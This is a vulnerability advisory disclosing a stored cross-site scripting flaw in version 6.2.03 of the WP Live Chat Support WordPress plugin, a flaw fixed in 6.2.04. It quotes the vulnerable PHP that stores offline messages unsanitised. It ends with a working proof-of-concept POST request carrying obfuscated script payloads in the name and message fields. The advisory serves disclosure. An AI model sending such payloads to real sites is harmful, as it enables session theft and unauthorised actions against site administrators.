@@ -1,0 +1,92 @@
+Stored Cross-Site Scripting vulnerability in WP Live Chat Support WordPress Plugin
+
+Abstract
+
+A stored Cross-Site Scripting vulnerability was found in the WP Live Chat Support WordPress Plugin. This issue can be exploited by an unauthenticated user. It allows an attacker to perform a wide variety of actions, such as stealing users' session tokens, or performing arbitrary actions on their behalf.
+
+Contact
+
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160724-0010
+
+Tested versions
+
+This issue was successfully tested on WP Live Chat Support WordPress Plugin version 6.2.03.
+
+Fix
+
+This issue is resolved in WP Live Chat Support version 6.2.04.
+
+Introduction
+
+WP Live Chat Support allows chatting with visitors of a WordPress site. A persistent Cross-Site Scripting vulnerability has been discovered in the WP Live Chat Support allowing an attacker to execute actions on behalf of a logged on WordPress user. A stored Cross-Site Scripting vulnerability was found in the WP Live Chat Support WordPress Plugin. This issue can be exploited by an unauthenticated user. It allows an attacker to perform a wide variety of actions, such as stealing users' session tokens, or performing arbitrary actions on their behalf.
+
+Details
+
+The vulnerability exists in the file wp-live-chat-support/functions.php (line 1233), which is called in the file wp-live-chat-support/wp-live-chat-support.php (line 602):
+
+wp-live-chat-support/wp-live-chat-support.php:
+
+600 if ($_POST['action'] == "wplc_user_send_offline_message") {
+601 if(function_exists('wplc_send_offline_msg')){ wplc_send_offline_msg($_POST['name'], $_POST['email'], $_POST['msg'], $_POST['cid']); }
+602 if(function_exists('wplc_store_offline_message')){ wplc_store_offline_message($_POST['name'], $_POST['email'], $_POST['msg']); }
+603 do_action("wplc_hook_offline_message",array(
+604 "cid"=>$_POST['cid'],
+605 "name"=>$_POST['name'],
+606 "email"=>$_POST['email'],
+607 "url"=>get_site_url(),
+608 "msg"=>$_POST['msg']
+609 )
+610 );
+611 }
+
+wp-live-chat-support/functions.php:
+
+1206 function wplc_store_offline_message($name, $email, $message){
+1207 global $wpdb;
+1208 global $wplc_tblname_offline_msgs;
+1209 
+1210 $wplc_settings = get_option('WPLC_SETTINGS');
+1211 
+1212 if(isset($wplc_settings['wplc_record_ip_address']) && $wplc_settings['wplc_record_ip_address'] == 1){
+1213 if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != '') {
+1214 $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
+1215 } else {
+1216 $ip_address = $_SERVER['REMOTE_ADDR'];
+1217 }
+1218 $offline_ip_address = $ip_address;
+1219 } else {
+1220 $offline_ip_address = "";
+1221 }
+1222 
+1223 
+1224 $ins_array = array(
+1225 'timestamp' => current_time('mysql'),
+1226 'name' => $name,
+1227 'email' => $email,
+1228 'message' => $message,
+1229 'ip' => $offline_ip_address,
+1230 'user_agent' => $_SERVER['HTTP_USER_AGENT']
+1231 );
+1232 
+1233 $rows_affected = $wpdb->insert( $wplc_tblname_offline_msgs, $ins_array );
+1234 return;
+1235 }
+
+The vulnerability can be exploited using a specially crafted POST request. The victim needs view the WP Live Chat Offline Messages page to trigger the Cross-Site Scripting payload. It should be noted taht the offline message functionality is available even if there is a logged on chat user present.
+
+Proof of concept
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: <target>
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 361
+Connection: close
+   
+action=wplc_user_send_offline_message&security=8d1fc19e30&cid=1&name=<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 32, 105, 110, 32, 110, 97, 109, 101, 33, 34, 41, 59));</script>&email=Mail&msg=<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 32, 105, 110, 32, 109, 115, 103, 33, 34, 41, 59));</script>
